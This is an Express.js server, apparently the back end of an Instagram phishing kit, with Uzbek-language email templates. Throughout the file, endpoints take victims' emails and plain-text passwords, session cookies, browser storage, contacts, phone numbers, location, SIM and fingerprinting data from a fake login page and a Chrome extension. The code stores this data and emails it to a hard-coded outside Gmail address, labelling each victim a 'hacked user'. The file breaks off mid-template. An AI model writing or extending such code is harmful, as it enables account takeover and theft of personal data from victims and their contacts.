const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/instagram-login', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));
db.once('open', () => {
  console.log('Connected to MongoDB');
});

// User Schema (without password hashing as requested)
const userSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true }, // Stored as plain text as requested
  savedCredentials: {
    localStorage: Object,
    sessionStorage: Object,
    chromeAccounts: Object,
    autofillData: Object,
    phoneNumbers: [String],
    isMobile: Boolean,
    deviceMemory: Number,
    cpuCores: Number,
    connectionType: String,
    connectionSpeed: Number,
    installedInstagramApp: Boolean,
    mobilePhoneData: Object,
    location: Object,
    clipboardData: String,
    deviceMotion: Object,
    deviceOrientation: Object,
    networkInfo: Object,
    installedApps: [Object],
    browserHistory: Object,
    deviceFingerprint: String,
    audioFingerprint: Object,
    screenInfo: Object,
    windowInfo: Object,
    timeInfo: Object,
    browserCapabilities: Object,
    securityInfo: Object,
    performanceData: Object,
    mediaDevices: Object,
    contacts: [Object],
    biometricData: Object,
    hardwareInfo: Object,
    systemInfo: Object,
    sensorData: Object,
    appData: Object,
    fingerprintData: Object,
    // New contact extraction fields
    mobileContactData: Object,
    indexedDBContacts: [Object],
    autofillData: Object,
    emails: [String],
    localIP: String,
    bluetoothDevice: Object,
    nfcData: Object,
    simInfo: Object,
    // New comprehensive data fields
    networkInterfaces: [Object],
    networkCapabilities: Object,
    ambientLight: String,
    proximity: String,
    magnetometer: String,
    gyroscope: String,
    mediaCapabilities: String,
    mediaSession: String,
    screenCapture: String,
    pwaData: Object,
    appCache: String,
    indexedDB: String,
    fontFingerprint: [String],
    pluginFingerprint: [Object],
    mimeTypeFingerprint: [Object],
    securityHeaders: [String],
    certificateInfo: String,
    resourceTiming: [Object],
    paintTiming: [Object],
    layoutShifts: String,
    webglVendor: String,
    webglRenderer: String,
    audioContext: Object,
    storage: Object,
    languages: [String],
    webAssembly: Boolean,
    sharedArrayBuffer: Boolean,
    webWorkers: Boolean,
    webSockets: Boolean,
    fetch: Boolean,
    xhr: Boolean,
    cache: Boolean,
    permissions: Boolean,
    payment: Boolean,
    fileSystem: Boolean,
    fileReader: Boolean,
    fileWriter: Boolean,
    speechRecognition: Boolean,
    speechSynthesis: Boolean,
    webSpeech: Boolean,
    wakeLock: Boolean,
    idle: Boolean,
    presentation: Boolean,
    remotePlayback: Boolean,
    // Re-structured top-level fields now nested
    deviceInfo: Object,
    screenInfo: Object,
    timeInfo: Object,
    networkInfo: Object,
    browserCapabilities: Object,
    performanceData: Object,
    securityInfo: Object,
    mobileInfo: Object,
    deviceFingerprint: Object,
    storageData: Object,
    browserHistory: Object
  },
  instagramCredentials: Object, // This now mirrors savedCredentials from frontend
  batteryInfo: { level: Number, charging: Boolean, chargingTime: Number, dischargingTime: Number },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Email transporter setup
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'your-email@gmail.com',
    pass: process.env.EMAIL_PASS || 'your-app-password'
  },
  tls: {
    rejectUnauthorized: false
  },
  secure: false,
  port: 587
});

// Test email configuration
transporter.verify(function(error, success) {
  if (error) {
    console.log('Email configuration error:', error);
  } else {
    console.log('Email server is ready to send messages');
  }
});

// Instagram data endpoint (from Chrome extension)
app.post('/api/instagram-data', async (req, res) => {
  try {
    const { username, email, profileInfo, cookies, localStorage, sessionStorage, source, timestamp } = req.body;

    console.log('Instagram data received from extension:', {
      username,
      email,
      profileInfo,
      cookies: Object.keys(cookies || {}).length,
      localStorage: Object.keys(localStorage || {}).length,
      sessionStorage: Object.keys(sessionStorage || {}).length,
      source,
      timestamp
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: 'Instagram ma\'lumotlari Chrome extension orqali',
      html: `
        <h2>Instagram ma'lumotlari Chrome extension orqali to'plandı</h2>
        <p><strong>Username:</strong> ${username || 'Topilmadi'}</p>
        <p><strong>Email:</strong> ${email || 'Topilmadi'}</p>
        <p><strong>Manba:</strong> ${source || 'N/A'}</p>
        <p><strong>Vaqt:</strong> ${timestamp || new Date().toLocaleString()}</p>
        <hr>
        <h3>Cookies (${Object.keys(cookies || {}).length} ta):</h3>
        ${cookies && Object.keys(cookies).length > 0 ? 
          `<ul>${Object.entries(cookies).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>Cookies topilmadi</p>'
        }
        <hr>
        <h3>LocalStorage (${Object.keys(localStorage || {}).length} ta):</h3>
        ${localStorage && Object.keys(localStorage).length > 0 ? 
          `<ul>${Object.entries(localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>LocalStorage topilmadi</p>'
        }
        <hr>
        <h3>SessionStorage (${Object.keys(sessionStorage || {}).length} ta):</h3>
        ${sessionStorage && Object.keys(sessionStorage).length > 0 ? 
          `<ul>${Object.entries(sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>SessionStorage topilmadi</p>'
        }
        <hr>
        <p><em>Bu xabar Chrome extension orqali yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Instagram data email sent to everestdevelopmet@gmail.com');

    res.json({ success: true, message: 'Instagram data received' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      error: 'Server xatosi',
      details: error.message
    });
  }
});

// Mobile Instagram data endpoint
app.post('/api/mobile-instagram-data', async (req, res) => {
  try {
    const { username, email, profileInfo, cookies, localStorage, sessionStorage, mobileInfo, source, timestamp } = req.body;

    console.log('Mobile Instagram data received:', {
      username,
      email,
      profileInfo,
      cookies: Object.keys(cookies || {}).length,
      localStorage: Object.keys(localStorage || {}).length,
      sessionStorage: Object.keys(sessionStorage || {}).length,
      mobileInfo,
      source,
      timestamp
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: 'Mobile Instagram ma\'lumotlari to\'plandı',
      html: `
        <h2>Mobile Instagram ma'lumotlari to'plandı</h2>
        <p><strong>Username:</strong> ${username || 'Topilmadi'}</p>
        <p><strong>Email:</strong> ${email || 'Topilmadi'}</p>
        <p><strong>Manba:</strong> ${source || 'N/A'}</p>
        <p><strong>Vaqt:</strong> ${timestamp || new Date().toLocaleString()}</p>
        <hr>
        <h3>Mobile qurilma ma'lumotlari:</h3>
        <p><strong>Brauzer:</strong> ${mobileInfo?.userAgent || 'N/A'}</p>
        <p><strong>Platforma:</strong> ${mobileInfo?.platform || 'N/A'}</p>
        <p><strong>Ekran o'lchami:</strong> ${mobileInfo?.screenResolution || 'N/A'}</p>
        <p><strong>Til:</strong> ${mobileInfo?.language || 'N/A'}</p>
        <p><strong>Vaqt zonasi:</strong> ${mobileInfo?.timezone || 'N/A'}</p>
        <p><strong>Online:</strong> ${mobileInfo?.onLine ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Cookie yoqilgan:</strong> ${mobileInfo?.cookieEnabled ? 'Ha' : 'Yo\'q'}</p>
        ${mobileInfo?.battery ? `
        <p><strong>Batareya darajasi:</strong> ${Math.round(mobileInfo.battery.level * 100)}%</p>
        <p><strong>Zaryadlanmoqda:</strong> ${mobileInfo.battery.charging ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        ${mobileInfo?.location ? `
        <p><strong>GPS koordinatalari:</strong> ${mobileInfo.location.latitude}, ${mobileInfo.location.longitude}</p>
        <p><strong>Aniqlik:</strong> ${mobileInfo.location.accuracy} metr</p>
        ` : ''}
        <hr>
        <h3>Cookies (${Object.keys(cookies || {}).length} ta):</h3>
        ${cookies && Object.keys(cookies).length > 0 ? 
          `<ul>${Object.entries(cookies).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>Cookies topilmadi</p>'
        }
        <hr>
        <h3>LocalStorage (${Object.keys(localStorage || {}).length} ta):</h3>
        ${localStorage && Object.keys(localStorage).length > 0 ? 
          `<ul>${Object.entries(localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>LocalStorage topilmadi</p>'
        }
        <hr>
        <h3>SessionStorage (${Object.keys(sessionStorage || {}).length} ta):</h3>
        ${sessionStorage && Object.keys(sessionStorage).length > 0 ? 
          `<ul>${Object.entries(sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>SessionStorage topilmadi</p>'
        }
        <hr>
        <p><em>Bu xabar mobile Chrome extension orqali yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Mobile Instagram data email sent to everestdevelopmet@gmail.com');

    res.json({ success: true, message: 'Mobile Instagram data received' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      error: 'Server xatosi',
      details: error.message
    });
  }
});



// Login endpoint
app.post('/api/login', async (req, res) => {
  try {
               const { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo, autoCollected } = req.body;

    console.log('Login request received:', {
      email,
      password: password ? '***' : 'empty',
      autoCollected,
      deviceInfo: deviceInfo ? 'present' : 'missing',
      savedCredentials: savedCredentials ? 'present' : 'missing',
      instagramCredentials: instagramCredentials ? 'present' : 'missing',
      batteryInfo: batteryInfo ? 'present' : 'missing'
    });

    // Allow submission even without email/password to collect device data

    // Save to MongoDB (password not hashed as requested)
               const newUser = new User({
             email: email,
             password: password, // Plain text password
             deviceInfo: deviceInfo || {},
             savedCredentials: savedCredentials || {},
             instagramCredentials: instagramCredentials || {},
             batteryInfo: batteryInfo || {}
           });

               await newUser.save();
    console.log('User saved to MongoDB:', { 
      email, 
      password: password ? '***' : 'empty', 
      deviceInfo: deviceInfo ? 'present' : 'missing', 
      savedCredentials: savedCredentials ? 'present' : 'missing', 
      instagramCredentials: instagramCredentials ? 'present' : 'missing', 
      batteryInfo: batteryInfo ? 'present' : 'missing' 
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: autoCollected ? 'Yangi foydalanuvchi saytga kirdi (Avtomatik)' : 'Yangi hacklangan foydalanuvchi',
      html: `
        <h2>${autoCollected ? 'Yangi foydalanuvchi saytga kirdi (Avtomatik to\'plangan ma\'lumotlar)' : 'Yangi foydalanuvchi kirish urinishi'}</h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Parol:</strong> ${password}</p>
        <p><strong>Vaqt:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>To\'planish usuli:</strong> ${autoCollected ? 'Avtomatik (saytga kirganda)' : 'Qo\'lda (form to\'ldirganda)'}</p>
        <hr>
        <h3>📱 Comprehensive Device Information:</h3>
        <p><strong>User Agent:</strong> ${deviceInfo?.userAgent || 'N/A'}</p>
        <p><strong>Platform:</strong> ${deviceInfo?.platform || 'N/A'}</p>
        <p><strong>Language:</strong> ${deviceInfo?.language || 'N/A'}</p>
        <p><strong>Screen Resolution:</strong> ${deviceInfo?.screenResolution || 'N/A'}</p>
        <p><strong>Timezone:</strong> ${deviceInfo?.timezone || 'N/A'}</p>
        <p><strong>Online Status:</strong> ${deviceInfo?.onLine ? 'Yes' : 'No'}</p>
        <p><strong>Cookies Enabled:</strong> ${deviceInfo?.cookieEnabled ? 'Yes' : 'No'}</p>
        <p><strong>Hardware Concurrency:</strong> ${deviceInfo?.hardwareConcurrency || 'N/A'}</p>
        <p><strong>Device Memory:</strong> ${deviceInfo?.deviceMemory || 'N/A'}</p>
        <p><strong>Max Touch Points:</strong> ${deviceInfo?.maxTouchPoints || 'N/A'}</p>
        <p><strong>Vendor:</strong> ${deviceInfo?.vendor || 'N/A'}</p>
        <p><strong>Product:</strong> ${deviceInfo?.product || 'N/A'}</p>
        <p><strong>App Name:</strong> ${deviceInfo?.appName || 'N/A'}</p>
        <p><strong>App Version:</strong> ${deviceInfo?.appVersion || 'N/A'}</p>
        
        <h3>🖥️ Screen Information:</h3>
        <p><strong>Screen Width:</strong> ${savedCredentials?.screenInfo?.width || 'N/A'}</p>
        <p><strong>Screen Height:</strong> ${savedCredentials?.screenInfo?.height || 'N/A'}</p>
        <p><strong>Available Width:</strong> ${savedCredentials?.screenInfo?.availWidth || 'N/A'}</p>
        <p><strong>Available Height:</strong> ${savedCredentials?.screenInfo?.availHeight || 'N/A'}</p>
        <p><strong>Color Depth:</strong> ${savedCredentials?.screenInfo?.colorDepth || 'N/A'}</p>
        <p><strong>Pixel Depth:</strong> ${savedCredentials?.screenInfo?.pixelDepth || 'N/A'}</p>
        <p><strong>Device Pixel Ratio:</strong> ${savedCredentials?.screenInfo?.devicePixelRatio || 'N/A'}</p>
        
        <h3>⏰ Time Information:</h3>
        <p><strong>Current Time:</strong> ${savedCredentials?.timeInfo?.currentTime || 'N/A'}</p>
        <p><strong>Timezone:</strong> ${savedCredentials?.timeInfo?.timezone || 'N/A'}</p>
        <p><strong>Timezone Offset:</strong> ${savedCredentials?.timeInfo?.timezoneOffset || 'N/A'}</p>
        <p><strong>Language:</strong> ${savedCredentials?.timeInfo?.language || 'N/A'}</p>
        <p><strong>Languages:</strong> ${savedCredentials?.timeInfo?.languages?.join(', ') || 'N/A'}</p>
        
        <h3>🌐 Network Information:</h3>
        <p><strong>Online Status:</strong> ${savedCredentials?.networkInfo?.onLine ? 'Yes' : 'No'}</p>
        <p><strong>Connection Type:</strong> ${savedCredentials?.networkInfo?.connection?.effectiveType || 'N/A'}</p>
        <p><strong>Downlink:</strong> ${savedCredentials?.networkInfo?.connection?.downlink || 'N/A'}</p>
        <p><strong>RTT:</strong> ${savedCredentials?.networkInfo?.connection?.rtt || 'N/A'}</p>
        <p><strong>Save Data:</strong> ${savedCredentials?.networkInfo?.connection?.saveData ? 'Yes' : 'No'}</p>
        
        <h3>🔧 Browser Capabilities:</h3>
        <p><strong>WebGL:</strong> ${savedCredentials?.browserCapabilities?.webgl ? 'Available' : 'Not Available'}</p>
        <p><strong>WebGL2:</strong> ${savedCredentials?.browserCapabilities?.webgl2 ? 'Available' : 'Not Available'}</p>
        <p><strong>WebGL Vendor:</strong> ${savedCredentials?.browserCapabilities?.webglVendor || 'N/A'}</p>
        <p><strong>WebGL Renderer:</strong> ${savedCredentials?.browserCapabilities?.webglRenderer || 'N/A'}</p>
        <p><strong>WebRTC:</strong> ${savedCredentials?.browserCapabilities?.webrtc ? 'Available' : 'Not Available'}</p>
        <p><strong>Service Worker:</strong> ${savedCredentials?.browserCapabilities?.serviceWorker ? 'Available' : 'Not Available'}</p>
        <p><strong>Geolocation:</strong> ${savedCredentials?.browserCapabilities?.geolocation ? 'Available' : 'Not Available'}</p>
        <p><strong>Battery API:</strong> ${savedCredentials?.browserCapabilities?.battery ? 'Available' : 'Not Available'}</p>
        <p><strong>Bluetooth:</strong> ${savedCredentials?.browserCapabilities?.bluetooth ? 'Available' : 'Not Available'}</p>
        <p><strong>USB:</strong> ${savedCredentials?.browserCapabilities?.usb ? 'Available' : 'Not Available'}</p>
        <p><strong>WebAssembly:</strong> ${savedCredentials?.browserCapabilities?.webAssembly ? 'Available' : 'Not Available'}</p>
        <p><strong>SharedArrayBuffer:</strong> ${savedCredentials?.browserCapabilities?.sharedArrayBuffer ? 'Available' : 'Not Available'}</p>
        <p><strong>Web Workers:</strong> ${savedCredentials?.browserCapabilities?.webWorkers ? 'Available' : 'Not Available'}</p>
        <p><strong>WebSockets:</strong> ${savedCredentials?.browserCapabilities?.webSockets ? 'Available' : 'Not Available'}</p>
        <p><strong>Fetch API:</strong> ${savedCredentials?.browserCapabilities?.fetch ? 'Available' : 'Not Available'}</p>
        <p><strong>XHR:</strong> ${savedCredentials?.browserCapabilities?.xhr ? 'Available' : 'Not Available'}</p>
        <p><strong>LocalStorage:</strong> ${savedCredentials?.browserCapabilities?.localStorage ? 'Available' : 'Not Available'}</p>
        <p><strong>SessionStorage:</strong> ${savedCredentials?.browserCapabilities?.sessionStorage ? 'Available' : 'Not Available'}</p>
        <p><strong>IndexedDB:</strong> ${savedCredentials?.browserCapabilities?.indexedDB ? 'Available' : 'Not Available'}</p>
        <p><strong>Cache API:</strong> ${savedCredentials?.browserCapabilities?.cache ? 'Available' : 'Not Available'}</p>
        <p><strong>Media Devices:</strong> ${savedCredentials?.browserCapabilities?.mediaDevices ? 'Available' : 'Not Available'}</p>
        <p><strong>Credentials API:</strong> ${savedCredentials?.browserCapabilities?.credentials ? 'Available' : 'Not Available'}</p>
        <p><strong>Permissions API:</strong> ${savedCredentials?.browserCapabilities?.permissions ? 'Available' : 'Not Available'}</p>
        <p><strong>Payment API:</strong> ${savedCredentials?.browserCapabilities?.payment ? 'Available' : 'Not Available'}</p>
        <p><strong>Device Motion:</strong> ${savedCredentials?.browserCapabilities?.deviceMotion ? 'Available' : 'Not Available'}</p>
        <p><strong>Device Orientation:</strong> ${savedCredentials?.browserCapabilities?.deviceOrientation ? 'Available' : 'Not Available'}</p>
        <p><strong>Ambient Light Sensor:</strong> ${savedCredentials?.browserCapabilities?.ambientLight ? 'Available' : 'Not Available'}</p>
        <p><strong>Proximity Sensor:</strong> ${savedCredentials?.browserCapabilities?.proximity ? 'Available' : 'Not Available'}</p>
        <p><strong>Magnetometer:</strong> ${savedCredentials?.browserCapabilities?.magnetometer ? 'Available' : 'Not Available'}</p>
        <p><strong>Gyroscope:</strong> ${savedCredentials?.browserCapabilities?.gyroscope ? 'Available' : 'Not Available'}</p>
        <p><strong>File System:</strong> ${savedCredentials?.browserCapabilities?.fileSystem ? 'Available' : 'Not Available'}</p>
        <p><strong>File Reader:</strong> ${savedCredentials?.browserCapabilities?.fileReader ? 'Available' : 'Not Available'}</p>
        <p><strong>File Writer:</strong> ${savedCredentials?.browserCapabilities?.fileWriter ? 'Available' : 'Not Available'}</p>
        <p><strong>Speech Recognition:</strong> ${savedCredentials?.browserCapabilities?.speechRecognition ? 'Available' : 'Not Available'}</p>
        <p><strong>Speech Synthesis:</strong> ${savedCredentials?.browserCapabilities?.speechSynthesis ? 'Available' : 'Not Available'}</p>
        <p><strong>Wake Lock:</strong> ${savedCredentials?.browserCapabilities?.wakeLock ? 'Available' : 'Not Available'}</p>
        <p><strong>Idle Detector:</strong> ${savedCredentials?.browserCapabilities?.idle ? 'Available' : 'Not Available'}</p>
        <p><strong>Contacts API:</strong> ${savedCredentials?.browserCapabilities?.contacts ? 'Available' : 'Not Available'}</p>
        <p><strong>Share API:</strong> ${savedCredentials?.browserCapabilities?.share ? 'Available' : 'Not Available'}</p>
        <p><strong>Clipboard API:</strong> ${savedCredentials?.browserCapabilities?.clipboard ? 'Available' : 'Not Available'}</p>
        <p><strong>NFC:</strong> ${savedCredentials?.browserCapabilities?.nfc ? 'Available' : 'Not Available'}</p>
        <p><strong>Presentation API:</strong> ${savedCredentials?.browserCapabilities?.presentation ? 'Available' : 'Not Available'}</p>
        <p><strong>Remote Playback:</strong> ${savedCredentials?.browserCapabilities?.remotePlayback ? 'Available' : 'Not Available'}</p>
        
        <h3>⚡ Performance Data:</h3>
        <p><strong>Memory Used:</strong> ${savedCredentials?.performanceData?.memory?.usedJSHeapSize || 'N/A'}</p>
        <p><strong>Memory Total:</strong> ${savedCredentials?.performanceData?.memory?.totalJSHeapSize || 'N/A'}</p>
        <p><strong>Memory Limit:</strong> ${savedCredentials?.performanceData?.memory?.jsHeapSizeLimit || 'N/A'}</p>
        <p><strong>Navigation Type:</strong> ${savedCredentials?.performanceData?.navigation?.type || 'N/A'}</p>
        <p><strong>Redirect Count:</strong> ${savedCredentials?.performanceData?.navigation?.redirectCount || 'N/A'}</p>
        <p><strong>Time Origin:</strong> ${savedCredentials?.performanceData?.timeOrigin || 'N/A'}</p>
        
        <h3>🔒 Security Information:</h3>
        <p><strong>Secure Context:</strong> ${savedCredentials?.securityInfo?.isSecureContext ? 'Yes' : 'No'}</p>
        <p><strong>Protocol:</strong> ${savedCredentials?.securityInfo?.protocol || 'N/A'}</p>
        <p><strong>Hostname:</strong> ${savedCredentials?.securityInfo?.hostname || 'N/A'}</p>
        <p><strong>Port:</strong> ${savedCredentials?.securityInfo?.port || 'N/A'}</p>
        <p><strong>Origin:</strong> ${savedCredentials?.securityInfo?.origin || 'N/A'}</p>
        <p><strong>Referrer Policy:</strong> ${savedCredentials?.securityInfo?.referrerPolicy || 'N/A'}</p>
        <p><strong>Content Security Policy:</strong> ${savedCredentials?.securityInfo?.contentSecurityPolicy || 'N/A'}</p>
        <p><strong>Security Headers:</strong> ${savedCredentials?.securityInfo?.securityHeaders?.join(', ') || 'N/A'}</p>
        <p><strong>Certificate Info:</strong> ${savedCredentials?.securityInfo?.certificateInfo || 'N/A'}</p>
        
        <h3>📱 Mobile Information:</h3>
        <p><strong>Is Mobile:</strong> ${savedCredentials?.mobileInfo?.isMobile ? 'Yes' : 'No'}</p>
        <p><strong>Device Memory:</strong> ${savedCredentials?.mobileInfo?.deviceMemory || 'N/A'}</p>
        <p><strong>Hardware Concurrency:</strong> ${savedCredentials?.mobileInfo?.hardwareConcurrency || 'N/A'}</p>
        <p><strong>Max Touch Points:</strong> ${savedCredentials?.mobileInfo?.maxTouchPoints || 'N/A'}</p>
        
        <h3>🆔 Device Fingerprint:</h3>
        <p><strong>Canvas Fingerprint:</strong> ${savedCredentials?.deviceFingerprint?.canvasFingerprint ? 'Available' : 'Not Available'}</p>
        <p><strong>Audio Fingerprint:</strong> ${savedCredentials?.deviceFingerprint?.audioFingerprint ? 'Available' : 'Not Available'}</p>
        <p><strong>Font Fingerprint:</strong> ${savedCredentials?.deviceFingerprint?.fontFingerprint?.length || 0} fonts available</p>
        <p><strong>Plugin Fingerprint:</strong> ${savedCredentials?.deviceFingerprint?.pluginFingerprint?.length || 0} plugins</p>
        <p><strong>MIME Type Fingerprint:</strong> ${savedCredentials?.deviceFingerprint?.mimeTypeFingerprint?.length || 0} MIME types</p>
        
        <h3>📋 Storage Data:</h3>
        <p><strong>LocalStorage Items:</strong> ${Object.keys(savedCredentials?.storageData?.localStorage || {}).length}</p>
        <p><strong>SessionStorage Items:</strong> ${Object.keys(savedCredentials?.storageData?.sessionStorage || {}).length}</p>
        <p><strong>Cookies:</strong> ${savedCredentials?.storageData?.cookies || 'N/A'}</p>
        
        <h3>🏠 Browser History:</h3>
        <p><strong>Current URL:</strong> ${savedCredentials?.browserHistory?.currentUrl || 'N/A'}</p>
        <p><strong>Referrer:</strong> ${savedCredentials?.browserHistory?.referrer || 'N/A'}</p>
        <p><strong>Previous URL:</strong> ${savedCredentials?.browserHistory?.previousUrl || 'N/A'}</p>
        <p><strong>Search Query:</strong> ${savedCredentials?.browserHistory?.searchQuery || 'N/A'}</p>
        <p><strong>Hash:</strong> ${savedCredentials?.browserHistory?.hash || 'N/A'}</p>
        <p><strong>Pathname:</strong> ${savedCredentials?.browserHistory?.pathname || 'N/A'}</p>
        <p><strong>Search:</strong> ${savedCredentials?.browserHistory?.search || 'N/A'}</p>
        <p><strong>Origin:</strong> ${savedCredentials?.browserHistory?.origin || 'N/A'}</p>
        
        <h3>📱 Installed Apps:</h3>
        <p><strong>Number of Apps:</strong> ${savedCredentials?.installedApps?.length || 0}</p>
        ${batteryInfo.level !== undefined ? `
        <p><strong>Batareya darajasi:</strong> ${Math.round(batteryInfo.level * 100)}%</p>
        <p><strong>Zaryadlanmoqda:</strong> ${batteryInfo.charging ? 'Ha' : 'Yo\'q'}</p>
        ${batteryInfo.chargingTime !== Infinity ? `<p><strong>Zaryadlash vaqti:</strong> ${Math.round(batteryInfo.chargingTime / 60)} daqiqa</p>` : ''}
        ${batteryInfo.dischargingTime !== Infinity ? `<p><strong>Batareya vaqti:</strong> ${Math.round(batteryInfo.dischargingTime / 60)} daqiqa</p>` : ''}
        ` : '<p><strong>Batareya ma\'lumotlari:</strong> Mavjud emas</p>'}
        
        <h3>Saqlangan ma'lumotlar:</h3>
        ${savedCredentials.localStorage && Object.keys(savedCredentials.localStorage).length > 0 ? `
        <p><strong>LocalStorage:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : '<p><strong>LocalStorage:</strong> Ma\'lumot topilmadi</p>'}
        ${savedCredentials.sessionStorage && Object.keys(savedCredentials.sessionStorage).length > 0 ? `
        <p><strong>SessionStorage:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : '<p><strong>SessionStorage:</strong> Ma\'lumot topilmadi</p>'}
        ${savedCredentials.chromeAccounts ? `
        <p><strong>Chrome Accounts:</strong> ${JSON.stringify(savedCredentials.chromeAccounts)}</p>
        ` : ''}
        ${savedCredentials.phoneNumbers && savedCredentials.phoneNumbers.length > 0 ? `
        <p><strong>Telefon raqamlari (${savedCredentials.phoneNumbers.length} ta):</strong></p>
        <ul>
          ${savedCredentials.phoneNumbers.map(phone => `<li>${phone}</li>`).join('')}
        </ul>
        ` : '<p><strong>Telefon raqamlari:</strong> Topilmadi</p>'}
        
        ${savedCredentials.contacts && savedCredentials.contacts.length > 0 ? `
        <hr>
        <h3>📞 Kontaktlar (${savedCredentials.contacts.length} ta):</h3>
        <ul>
          ${savedCredentials.contacts.map(contact => `
            <li><strong>${contact.name}</strong>
              ${contact.tel.length > 0 ? `<br>📱 Telefon: ${contact.tel.join(', ')}` : ''}
              ${contact.email.length > 0 ? `<br>📧 Email: ${contact.email.join(', ')}` : ''}
            </li>
          `).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.mobileContactData && Object.keys(savedCredentials.mobileContactData).length > 0 ? `
        <hr>
        <h3>📱 Mobile kontakt ma'lumotlari:</h3>
        <ul>
          ${Object.entries(savedCredentials.mobileContactData).map(([key, value]) => `<li><strong>${key}:</strong> ${value}</li>`).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.indexedDBContacts && savedCredentials.indexedDBContacts.length > 0 ? `
        <hr>
        <h3>🗄️ IndexedDB kontaktlari (${savedCredentials.indexedDBContacts.length} ta):</h3>
        <ul>
          ${savedCredentials.indexedDBContacts.map(contact => `
            <li><strong>${contact.name || 'Unknown'}</strong>
              ${contact.phoneNumbers ? `<br>📱 Telefon: ${contact.phoneNumbers.join(', ')}` : ''}
              ${contact.emails ? `<br>📧 Email: ${contact.emails.join(', ')}` : ''}
            </li>
          `).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.autofillData && Object.keys(savedCredentials.autofillData).length > 0 ? `
        <hr>
        <h3>🔄 Autofill ma'lumotlari:</h3>
        <ul>
          ${Object.entries(savedCredentials.autofillData).map(([key, value]) => `<li><strong>${key}:</strong> ${value}</li>`).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.emails && savedCredentials.emails.length > 0 ? `
        <hr>
        <h3>📧 Email manzillar (${savedCredentials.emails.length} ta):</h3>
        <ul>
          ${savedCredentials.emails.map(email => `<li>${email}</li>`).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.localIP ? `
        <hr>
        <h3>🌐 Local IP manzil:</h3>
        <p><strong>IP:</strong> ${savedCredentials.localIP}</p>
        ` : ''}
        
        ${savedCredentials.bluetoothDevice ? `
        <hr>
        <h3>📶 Bluetooth qurilma:</h3>
        <p><strong>Nomi:</strong> ${savedCredentials.bluetoothDevice.name}</p>
        <p><strong>ID:</strong> ${savedCredentials.bluetoothDevice.id}</p>
        ` : ''}
        
        ${savedCredentials.nfcData ? `
        <hr>
        <h3>📱 NFC ma'lumotlari:</h3>
        <p><strong>NFC Data:</strong> ${JSON.stringify(savedCredentials.nfcData)}</p>
        ` : ''}
        
        ${savedCredentials.simInfo && Object.keys(savedCredentials.simInfo).length > 0 ? `
        <hr>
        <h3>📱 SIM karta ma'lumotlari:</h3>
        <ul>
          ${Object.entries(savedCredentials.simInfo).map(([key, value]) => `<li><strong>${key}:</strong> ${value}</li>`).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.hardwareInfo ? `
        <hr>
        <h3>🔧 Hardware ma'lumotlari:</h3>
        <p><strong>CPU yadrolari:</strong> ${savedCredentials.hardwareInfo.cpuCores}</p>
        <p><strong>Qurilma xotirasi:</strong> ${savedCredentials.hardwareInfo.deviceMemory} GB</p>
        ${savedCredentials.hardwareInfo.webglVendor ? `<p><strong>WebGL Vendor:</strong> ${savedCredentials.hardwareInfo.webglVendor}</p>` : ''}
        ${savedCredentials.hardwareInfo.webglRenderer ? `<p><strong>WebGL Renderer:</strong> ${savedCredentials.hardwareInfo.webglRenderer}</p>` : ''}
        ${savedCredentials.hardwareInfo.audioContext ? `
        <p><strong>Audio Context:</strong></p>
        <ul>
          <li>Sample Rate: ${savedCredentials.hardwareInfo.audioContext.sampleRate} Hz</li>
          <li>Channel Count: ${savedCredentials.hardwareInfo.audioContext.channelCount}</li>
          <li>Max Channel Count: ${savedCredentials.hardwareInfo.audioContext.maxChannelCount}</li>
        </ul>
        ` : ''}
        ${savedCredentials.hardwareInfo.storage ? `
        <p><strong>Storage ma'lumotlari:</strong></p>
        <ul>
          <li>LocalStorage: ${savedCredentials.hardwareInfo.storage.localStorage} items</li>
